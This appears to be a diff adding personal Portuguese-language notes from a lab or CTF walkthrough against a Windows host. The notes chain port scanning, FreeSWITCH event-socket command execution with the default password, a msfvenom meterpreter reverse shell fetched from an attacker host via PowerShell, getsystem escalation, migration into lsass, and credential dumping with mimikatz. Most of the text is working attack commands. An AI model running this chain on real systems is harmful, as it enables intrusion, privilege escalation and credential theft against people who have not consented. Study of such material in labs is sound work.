@@ -1,0 +1,88 @@
+--> sudo rustscan -a 10.64.150.75
+
+Open 10.64.150.75:3389
+Open 10.64.150.75:8021
+
+--> sudo nmap -sV -sC -Pn -p3389,8021 10.64.150.75
+
+PORT     STATE SERVICE          VERSION
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+|_ssl-date: 2026-03-10T12:47:19+00:00; 0s from scanner t10.64.150.75ime.
+| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
+| Not valid before: 2026-03-09T12:42:59
+|_Not valid after:  2026-09-08T12:42:59
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EOM4PK0578N
+|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
+|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
+|   DNS_Domain_Name: WIN-EOM4PK0578N
+|   DNS_Computer_Name: WIN-EOM4PK0578N
+|   Product_Version: 10.0.17763		--> VERSÃO KERNEL
+|_  System_Time: 2026-03-10T12:47:15+00:00
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+8021 -> freeswitch
+3389 ms-wbt-server
+
+
+--> searchsploit FreeSWITCH
+--> FreeSWITCH - Event Socket Command Execution (Metasploit)
+
+
+--> msfconsole
+--> search type:exploit FreeSWITCH
+--> use exploit/multi/misc/freeswitch_event_socket_cmd_exec
+--> show options
+--> set RHOSTS 10.64.150.75
+--> exploit
+
+FreeSWITCH password default: ClueCon
+
+Enviando o exploit para a máquina:
+
+trocando a senha do usuário para me logar via RDP
+--> net user nekrotic al1enum#4ttack (logou mas não foi possível fazer muita coisa)
+
+criando a shell:
+--> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.114 LPORT=4444 -f exe > shell.exe
+
+enviando para o servidor:
+--> python3 exploit.py 10.64.164.244 'powershell Invoke-WebRequest http://192.168.200.114:80/shell.exe -o C:\Users\Nekrotic\Desktop\shell.exe'
+
+METASPLOIT
+
+--> use multi/handler
+--> set lhost 192.168.200.114
+--> set lport 4444
+--> set payload windows/x64/meterpreter/reverse_tcp
+--> run
+
+agora rodando a shell no servidor para ganhar acesso ao metasploit
+
+--> python3 exploit.py 10.64.164.244 '\Users\Nekrotic\Desktop\shell.exe'
+--> Pronto ganhei a shell no metasploit
+
+
+--> getuid --> verifica o usuário atual
+--> getsystem:
+
+getsystem -t 1
+getsystem -t 2
+getsystem -t 3
+
+força técnicas específicas de escalonamento de privilégios!
+
+--> getsystem usa geralmente a técnica 1: got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+--> O Meterpreter cria um Named Pipe no sistema.
+--> Um processo/serviço com privilégios SYSTEM se conecta a esse pipe.
+--> O Meterpreter impersona o token de segurança desse processo.
+--> Sua sessão passa a executar como SYSTEM.
+
+MANTER SESSÃO: migrate -N winlogon.exe ou migrate -N lsass.exe (Serve para não perder conexão)
+
+Carregando mimikatz:
+
+--> load kiwi (Carrega o Mimikatz)
+--> creds_all --> MOSTRA TODAS AS CREDÊNCIAIS
